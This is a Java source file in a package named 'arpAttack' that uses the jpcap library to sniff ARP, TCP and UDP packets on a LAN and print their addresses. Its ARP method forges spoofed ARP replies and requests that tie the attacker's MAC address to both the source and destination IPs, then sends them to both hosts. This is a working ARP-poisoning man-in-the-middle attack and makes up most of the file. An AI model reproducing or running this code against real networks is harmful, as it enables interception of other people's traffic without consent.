package org.LL.arpAttack;

import java.io.IOException;
import java.net.InetAddress;
import java.util.HashMap;

import jpcap.JpcapCaptor;
import jpcap.JpcapSender;
import jpcap.NetworkInterface;
import jpcap.packet.ARPPacket;
import jpcap.packet.EthernetPacket;
import jpcap.packet.TCPPacket;
import jpcap.packet.UDPPacket;

/**
 * @author Administrator
 * 
 */
public class Communication_intercepter {
	JpcapSender Jsender;
	JpcapCaptor Jcaptor;
	ARPPacket arppacket = null;
	TCPPacket tcppacket = null;
	EthernetPacket etherpacket;
	NetworkInterface[] networkinterface;
	UDPPacket udppacket = null;
	int recieved_packet = 0, trial_time = 1;
	int max_packet = 10, max_trial_time = 1000;
	boolean time_zone_setted = false;
	byte[] null_mac = { (byte) 0, (byte) 0, (byte) 0, (byte) 0, (byte) 0,
			(byte) 0 };
	String my_mac = "";
	
	HashMap commu_notes = null, ip_mac = null;

	public Communication_intercepter() {
		super();
		// TODO Auto-generated constructor stub
		try {
			networkinterface = JpcapCaptor.getDeviceList();
			Jcaptor = JpcapCaptor.openDevice(networkinterface[0], 65535, false,
					20);
			this.setMy_mac(networkinterface[0]);
			System.out.println("MY PC PAREMETERS\nIP:"+InetAddress.getLocalHost().getHostAddress()+"\nMAC:"+this.getMy_mac()+"\n");

			int terminH = 23, terminM = 50;
			new Timer(terminH, terminM).start();
			this.time_zone_setted = true;

			commu_notes = new HashMap();
			ip_mac = new HashMap();

		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} finally {
			System.out.println(" packet intercepter started ");
		}
	}
	
	/**
	 * @return the my_mac
	 */
	public String getMy_mac() {
		return my_mac;
	}

	/**
	 * @param myMac the my_mac to set
	 */
	public void setMy_mac(NetworkInterface Ninterface) {
		my_mac = "";
		for(byte b: Ninterface.mac_address){
			my_mac += Integer.toHexString(b&0xff)+":";
		}
		my_mac = my_mac.substring(0, my_mac.length()-1);
	}


	/**
	 * process the udp packets broadcasting through LAN
	 * @return null
	 */
	public void UDP(){
		try {
			Jcaptor.setFilter("udp", true);
			while (this.time_zone_setted) {
				while (udppacket == null ) 
					udppacket = (UDPPacket) this.Jcaptor.getPacket();
				
				System.out.println("packet " + (++recieved_packet));
				System.out.println("source ip:" + udppacket.src_ip+":"+udppacket.src_port);
				System.out.println("destination ip:" + udppacket.dst_ip+":"+udppacket.dst_port);
				
				if(this.recieved_packet > 10) break;
				
				
			}
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		
	}

	/**
	 * process the tcp packets broadcasting through LAN
	 * 
	 * @return null
	 */
	public void TCP() {
		try {
			// Initialize the captor
			Jcaptor.setFilter("ip and tcp", true);
			while (this.time_zone_setted) {

				while (tcppacket == null ) 
					tcppacket = (TCPPacket) this.Jcaptor.getPacket();
				
				System.out.println("packet " + (++recieved_packet));
				System.out.println("source ip:" + tcppacket.src_ip);
				System.out.println("destination ip:" + tcppacket.dst_ip);
				
				if(this.recieved_packet > 10) break;
				this.recieved_packet++;
			}

		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} finally {
			if (this.Jsender != null)
				this.Jsender.close();
			this.Jcaptor.close();
			System.exit(0);
		}

	}

	/**
	 * process the arp packets broadcasting through LAN
	 * 
	 * @return null
	 */
	public void ARP() {
		try {

			Jcaptor.setFilter("arp", true);

			while (this.time_zone_setted) {

				while ( arppacket == null)
					arppacket = (ARPPacket) this.Jcaptor.getPacket();
				
				
				
				System.out.println("packet " + (++recieved_packet));
				System.out.println("datalink: " + this.arppacket.datalink);
				System.out.println("operation: " + this.arppacket.operation);
				System.out.println("source ip: "
						+ arppacket.getSenderProtocolAddress());
				System.out.println("source mac: "
						+ arppacket.getSenderHardwareAddress());
				System.out.println("destination ip: "
						+ arppacket.getTargetProtocolAddress());
				System.out.println("destination mac: "
						+ arppacket.getTargetHardwareAddress());

				if(!arppacket.getSenderHardwareAddress().equals(this.getMy_mac())){

					byte[] src_mac = this.arppacket.sender_hardaddr;
					byte[] src_ip = this.arppacket.sender_protoaddr;
					byte[] target_ip = this.arppacket.target_protoaddr;
					byte[] target_mac = this.arppacket.target_hardaddr;
	
					byte[] my_mac = networkinterface[0].mac_address; // my mac address
	
					this.ip_mac.put(src_ip, src_mac);
					if (this.arppacket.getTargetHardwareAddress().toString()
							.indexOf("00:00") == -1)
						this.commu_notes.put(src_mac, target_mac);
	
					// create fake arp packet used for spoofing
					ARPPacket arppacket1 = new ARPPacket();
					ARPPacket arppacket2 = new ARPPacket();
					arppacket2.operation = 1;
	
					// set ARP packet parameters
					// arppacket1 will be sent to the source node, and arppacket2 to
					// the end node,
					arppacket1.hardtype = ARPPacket.HARDTYPE_ETHER;
					arppacket1.prototype = ARPPacket.PROTOTYPE_IP;
					arppacket1.operation = ARPPacket.ARP_REPLY;
					arppacket1.hlen = 6;
					arppacket1.plen = 4;
	
					arppacket2.hardtype = ARPPacket.HARDTYPE_ETHER;
					arppacket2.prototype = ARPPacket.PROTOTYPE_IP;
					arppacket2.operation = this.arppacket.operation;
					arppacket2.hlen = 6;
					arppacket2.plen = 4;
	
					arppacket1.sender_hardaddr = my_mac;
					arppacket1.sender_protoaddr = target_ip;
					arppacket1.target_hardaddr = src_mac;
					arppacket1.target_protoaddr = src_ip;
	
					arppacket2.sender_hardaddr = my_mac;
					arppacket2.sender_protoaddr = src_ip;
					if (this.arppacket.target_hardaddr.toString().indexOf("00:00") > -1)
						arppacket2.target_hardaddr = this.null_mac;
					else
						arppacket2.target_hardaddr = target_mac;
	
					arppacket2.target_protoaddr = target_ip;
	
					// Initialize the Ethernet packet
					this.etherpacket = new EthernetPacket();
					this.etherpacket.frametype = EthernetPacket.ETHERTYPE_ARP;
					this.etherpacket.src_mac = my_mac;
					this.etherpacket.dst_mac = src_mac;
					arppacket1.datalink = this.etherpacket;
	
					this.etherpacket = new EthernetPacket();
					this.etherpacket.frametype = EthernetPacket.ETHERTYPE_ARP;
					this.etherpacket.src_mac = my_mac;
					if (this.arppacket.target_hardaddr.toString().indexOf("00:00") > -1)
						this.etherpacket.dst_mac = this.null_mac;
					else
						this.etherpacket.dst_mac = target_mac;
	
					arppacket2.datalink = this.etherpacket;
	
					// Initialize the sender
					this.Jsender = this.Jcaptor.getJpcapSenderInstance();
	
					// send out the spoofing arp packet to original source node
					this.Jsender.sendPacket(arppacket1);
	
					// send out the spoofing arp packet to original destination node
					this.Jsender.sendPacket(arppacket2);
				}
				if (this.recieved_packet > 10)
					break;
				
				arppacket = null;
			}
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} finally {
			if (this.Jsender != null)
				this.Jsender.close();
			this.Jcaptor.close();
			System.out.println(" stopped ");
			System.exit(0);
		}

	}

	/**
	 * 
	 */
	public void summary() {

	}

}
